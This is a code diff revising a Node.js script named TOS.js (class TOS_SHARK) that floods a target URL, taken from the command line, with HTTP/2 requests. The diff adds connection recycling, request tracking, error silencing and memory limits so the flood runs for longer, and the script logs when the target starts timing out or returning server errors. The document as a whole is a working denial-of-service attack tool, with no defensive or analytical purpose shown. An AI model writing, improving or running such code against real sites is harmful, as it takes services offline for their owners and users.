@@ -11,11 +11,15 @@ class TOS_SHARK {
         this.lastLog = Date.now();
         this.reqCounter = 0;
         
-        // Bulletproof connections
-        this.conns = [];
-        this.maxConns = 5; // Fewer but more stable
+        // Manual tracking to prevent leaks
+        this.activeRequests = new Set();
+        this.timeoutIds = new Set();
+        this.lastCleanup = Date.now();
         
-        // Print header once
+        // Connections
+        this.conns = [];
+        this.maxConns = 3; // Even fewer
+        
         console.log(`TØS-SHARK | *.* | MT-3M22`);
         console.log('-----------------------------------------------------------------');
         
@@ -28,171 +32,151 @@ class TOS_SHARK {
     }
 
     start() {
-        // Setup connections with error handling
+        // Setup minimal connections
         for (let i = 0; i < this.maxConns; i++) {
-            this.createConnection(i);
+            this.createConnection();
         }
         
         // Start attack
         this.attackLoop();
         
-        // Auto-reconnect dead connections
-        setInterval(() => {
-            this.checkConnections();
-        }, 5000);
+        // Regular cleanup
+        setInterval(() => this.cleanup(), 3000);
         
         process.on('SIGINT', () => {
-            this.running = false;
+            this.stop();
             process.exit(0);
         });
     }
 
-    createConnection(id) {
+    createConnection() {
         try {
             const client = http2.connect(this.target, {
-                maxSessionMemory: 4096, // Less memory
-                maxDeflateDynamicTableSize: 4096
+                maxSessionMemory: 2048, // VERY low memory
+                maxDeflateDynamicTableSize: 1024
             });
             
-            // Set low listeners to prevent memory leaks
-            client.setMaxListeners(20);
+            client.setMaxListeners(10);
             
-            // Handle ALL possible errors
-            client.on('error', (err) => {
-                // Silent - will be recreated
-                setTimeout(() => {
-                    this.createConnection(id);
-                }, 1000);
-            });
+            // Simple error handler
+            const errorHandler = () => {
+                try { client.destroy(); } catch (e) {}
+                setTimeout(() => this.createConnection(), 1000);
+            };
             
-            client.on('close', () => {
-                setTimeout(() => {
-                    this.createConnection(id);
-                }, 1000);
-            });
+            client.on('error', errorHandler);
+            client.on('close', errorHandler);
             
-            client.on('frameError', () => {
-                // Silent
-            });
-            
-            client.on('goaway', () => {
-                setTimeout(() => {
-                    this.createConnection(id);
-                }, 2000);
-            });
-            
-            this.conns[id] = client;
+            this.conns.push(client);
+            return client;
             
         } catch (err) {
-            // Retry in 2 seconds
-            setTimeout(() => {
-                this.createConnection(id);
-            }, 2000);
+            setTimeout(() => this.createConnection(), 1000);
         }
     }
 
-    checkConnections() {
-        for (let i = 0; i < this.maxConns; i++) {
-            if (!this.conns[i] || this.conns[i].destroyed || this.conns[i].closed) {
-                this.createConnection(i);
-            }
-        }
-    }
-
-    getRandomPath() {
-        const paths = ['/', '/api', '/static', '/data', '/v1', '/v2', '/test', '/ping'];
-        return paths[Math.floor(Math.random() * paths.length)];
-    }
-
-    getRandomHeaders() {
-        return {
-            'user-agent': 'Mozilla/5.0',
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache'
-        };
-    }
-
-    async attackLoop() {
-        while (this.running) {
-            try {
-                // Get active connections
-                const activeConns = this.conns.filter(c => c && !c.destroyed && !c.closed);
-                
-                if (activeConns.length === 0) {
-                    await this.sleep(100);
-                    continue;
-                }
-                
-                // Send 20 requests per tick (safer)
-                for (let i = 0; i < 20; i++) {
-                    const client = activeConns[Math.floor(Math.random() * activeConns.length)];
-                    
-                    if (!client) continue;
-                    
-                    this.sendRequest(client).catch(() => {});
-                }
-                
-                await this.sleep(0.5); // Slightly longer delay
-                
-            } catch (err) {
-                // Catch ANY loop error and continue
-                await this.sleep(100);
-            }
-        }
-    }
-
-    async sendRequest(client) {
-        return new Promise((resolve) => {
-            this.reqCounter++;
-            this.totalReqs++;
+    attackLoop() {
+        // Use setImmediate instead of promises for cleanup
+        const loop = () => {
+            if (!this.running) return;
             
-            // Set timeout
-            const timeout = setTimeout(() => {
+            this.cleanup();
+            
+            // Get active connections
+            const active = this.conns.filter(c => c && !c.destroyed && !c.closed);
+            
+            if (active.length > 0) {
+                // Send 5 requests per loop (VERY conservative)
+                for (let i = 0; i < 5; i++) {
+                    this.sendRequest(active[Math.floor(Math.random() * active.length)]);
+                }
+            }
+            
+            // Schedule next iteration
+            setTimeout(loop, 1); // 1ms delay
+        };
+        
+        loop();
+    }
+
+    sendRequest(client) {
+        if (!client || client.destroyed || client.closed) return;
+        
+        const reqId = ++this.reqCounter;
+        this.totalReqs++;
+        
+        try {
+            const req = client.request({
+                ':method': 'GET',
+                ':path': '/',
+                ':authority': this.host
+            });
+            
+            // Track this request
+            this.activeRequests.add(req);
+            
+            // Manual timeout WITHOUT creating promise
+            const timeoutId = setTimeout(() => {
                 this.logStatus('TIMEOUT');
-                resolve();
+                try { req.destroy(); } catch (e) {}
+                this.activeRequests.delete(req);
+                this.timeoutIds.delete(timeoutId);
             }, 3000);
             
-            try {
-                const req = client.request({
-                    ':method': 'GET',
-                    ':path': `${this.getRandomPath()}?t=${Date.now()}`,
-                    ':authority': this.host,
-                    ...this.getRandomHeaders()
-                });
-                
-                req.on('response', (headers) => {
-                    clearTimeout(timeout);
-                    const status = headers[':status'];
-                    this.logStatus(status);
-                    req.destroy(); // IMPORTANT: Destroy stream
-                    resolve();
-                });
-                
-                req.on('error', (err) => {
-                    clearTimeout(timeout);
-                    if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED' || 
-                        err.code === 'ETIMEDOUT' || err.code === 'EPIPE') {
-                        this.logStatus('TIMEOUT');
-                    } else {
-                        this.logStatus('ERROR');
-                    }
-                    resolve();
-                });
-                
-                req.on('close', () => {
-                    clearTimeout(timeout);
-                    resolve();
-                });
-                
-                req.end();
-                
-            } catch (err) {
-                clearTimeout(timeout);
+            this.timeoutIds.add(timeoutId);
+            
+            req.on('response', (headers) => {
+                clearTimeout(timeoutId);
+                this.timeoutIds.delete(timeoutId);
+                const status = headers[':status'];
+                this.logStatus(status);
+                req.destroy();
+                this.activeRequests.delete(req);
+            });
+            
+            req.on('error', () => {
+                clearTimeout(timeoutId);
+                this.timeoutIds.delete(timeoutId);
                 this.logStatus('ERROR');
-                resolve();
+                this.activeRequests.delete(req);
+            });
+            
+            req.on('close', () => {
+                clearTimeout(timeoutId);
+                this.timeoutIds.delete(timeoutId);
+                this.activeRequests.delete(req);
+            });
+            
+            req.end();
+            
+        } catch (err) {
+            this.logStatus('ERROR');
+        }
+    }
+
+    cleanup() {
+        const now = Date.now();
+        
+        // Clean old timeouts
+        if (now - this.lastCleanup > 5000) {
+            this.lastCleanup = now;
+            
+            // Force garbage collection if available
+            if (global.gc) {
+                global.gc();
             }
-        });
+            
+            // Remove dead connections
+            this.conns = this.conns.filter(c => c && !c.destroyed && !c.closed);
+            
+            // Keep connection count stable
+            while (this.conns.length < this.maxConns) {
+                this.createConnection();
+            }
+            
+            // Log cleanup
+            // console.log(`[~] Cleanup: ${this.activeRequests.size} active, ${this.timeoutIds.size} timeouts`);
+        }
     }
 
     logStatus(status) {
@@ -212,38 +196,59 @@ class TOS_SHARK {
             } else if (typeof status === 'number' && status >= 400) {
                 color = 'y';
                 text = status;
-            } else if (typeof status === 'number') {
-                text = status;
             }
             
             console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
             
-            // Down event - only for TIMEOUT or 5xx
             if ((status === 'TIMEOUT' || (typeof status === 'number' && status >= 500)) && color === 'r') {
                 console.log(this.color(`{3M22-${this.reqCounter} --> ${text}}`, 'r'));
             }
         }
     }
 
-    sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
+    stop() {
+        this.running = false;
+        
+        // Cleanup everything manually
+        this.activeRequests.forEach(req => {
+            try { req.destroy(); } catch (e) {}
+        });
+        
+        this.timeoutIds.forEach(id => {
+            clearTimeout(id);
+        });
+        
+        this.conns.forEach(client => {
+            try { client.destroy(); } catch (e) {}
+        });
+        
+        this.activeRequests.clear();
+        this.timeoutIds.clear();
+        this.conns = [];
     }
 }
 
-// Run
+// Run with memory limits
 if (require.main === module) {
-    // Global error handlers
-    process.on('uncaughtException', (err) => {
-        // Silently ignore all errors
-    });
+    // Set memory limits BEFORE requiring anything
+    const oldLimit = require('v8').getHeapStatistics().heap_size_limit;
+    const newLimit = Math.min(oldLimit, 256 * 1024 * 1024); // 256MB max
     
-    process.on('unhandledRejection', () => {
-        // Silently ignore
-    });
+    // Set flags
+    process.env.NODE_OPTIONS = `--max-old-space-size=${Math.floor(newLimit / 1024 / 1024)}`;
+    
+    // Global error silence
+    process.on('uncaughtException', () => {});
+    process.on('unhandledRejection', () => {});
     
     if (process.argv.length < 3) {
         console.log('Usage: node TOS.js https://target.com');
         process.exit(1);
+    }
+    
+    // Run with forced GC every 30 seconds
+    if (global.gc) {
+        setInterval(() => global.gc(), 30000);
     }
     
     new TOS_SHARK(process.argv[2]);
